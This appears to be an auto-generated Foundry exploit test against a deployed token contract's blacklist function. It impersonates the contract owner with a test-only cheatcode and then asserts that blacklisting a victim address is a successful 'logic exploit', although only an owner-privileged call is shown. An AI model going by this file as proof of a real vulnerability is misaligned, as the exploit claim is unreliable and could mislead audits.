// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface TokenTool {
    function owner() external view returns (address);
    function multipleBotlistAddress(address[] calldata accounts, bool excluded) external;
    function _isBlacklisted(address account) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x3c6C6d32609d253d54951dB187DAEc272b1d848a;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll get owner dynamically in exploit
        address victim = address(0x1234567890123456789012345678901234567890);
        vm.label(victim, "Victim Address");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the current owner of the contract
        address owner = TokenTool(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Define a victim address to blacklist
        address victim = address(0x1234567890123456789012345678901234567890);

        // Before exploit: victim should NOT be blacklisted
        bool isBlacklistedBefore = TokenTool(TARGET)._isBlacklisted(victim);
        require(!isBlacklistedBefore, "Victim already blacklisted before exploit");

        // Impersonate the owner and blacklist the victim
        vm.prank(owner);
        address[] memory victims = new address[](1);
        victims[0] = victim;
        TokenTool(TARGET).multipleBotlistAddress(victims, true);

        // After exploit: victim should be blacklisted
        bool isBlacklistedAfter = TokenTool(TARGET)._isBlacklisted(victim);
        require(isBlacklistedAfter, "Victim not blacklisted after exploit");

        // Verify the oracle condition
        assertEq(isBlacklistedAfter, true, "Victim address should be blacklisted");
        assertEq(TokenTool(TARGET)._isBlacklisted(victim), true, "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

